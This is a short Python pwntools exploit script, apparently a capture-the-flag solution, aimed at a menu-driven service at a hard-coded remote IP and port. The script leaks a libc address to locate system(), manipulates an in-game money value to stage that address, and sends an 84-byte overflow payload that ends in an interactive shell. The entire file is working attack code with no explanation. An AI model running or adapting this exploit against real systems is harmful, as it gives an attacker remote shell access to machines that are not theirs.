from pwn import *

HOST, PORT = '127.0.0.1', 10000
HOST, PORT = '1.224.175.34', 10050
r = remote(HOST, PORT)

r.recvuntil(' : ')
r.sendline('sh')
r.recvuntil(' : ')
r.sendline('a')
r.recvuntil('>>> ')
r.sendline('3')
r.recvuntil(' : ')
r.sendline('a')
r.recvuntil('>>> ')
r.sendline('1')
for i in range(3):
	r.recvuntil('>>> ')
	r.sendline('2')
	r.recvuntil(' : ')
	r.sendline('a')
	r.recvuntil(' : ')
	r.sendline('a')
	r.recvuntil(' : ')
	r.sendline('a')
	r.recvuntil(' : ')
	r.sendline('a')
r.recvuntil('>>> ')
r.sendline('4')
r.recvuntil('>>>')
r.sendline('100')
r.recvuntil('>>> ')
r.sendline('4')
data = r.recvuntil('>>>')
r.sendline('3')
print `data`
data = data.split('[1] : ')[1].split('\n')[0].ljust(8, '\x00')
data = u64(data)
libc_base = data - 0x3c3b78
system = libc_base + 0x45390
print hex(libc_base), hex(system)
r.recvuntil('>>> ')
r.sendline('6')
r.recvuntil('>>> ')
r.sendline('3')
for i in range(2):
	target_money = system >> 32
	cur_money = 100
	r.recvuntil('>>> ')
	r.sendline('1')
	while cur_money != target_money:
		r.recvuntil('>>> ')
		r.sendline(str(cur_money - target_money))
		r.recvuntil('1 - 10.\n')
		r.sendline('1')
		data = r.recvline()
		print data
		if 'lose' in data:
			# lose?
			cur_money = target_money
			break
		else:
			# win?
			cur_money += cur_money - target_money
			continue
	while True:
		print r.recvuntil('>>> ')
		r.sendline(str(cur_money))
		r.recvuntil('.\n')
		r.sendline('1')
		data = r.recvline()
		print data
		if 'lose' in data:
			# lose?
			r.recvuntil('comment')
			break
		else:
			# win?
			cur_money += cur_money
			continue

	target = system & 0xffffffff

	payload = 'a' * 84
	payload += p64(target)
	payload = payload[:88]
	r.sendline(payload)
r.interactive()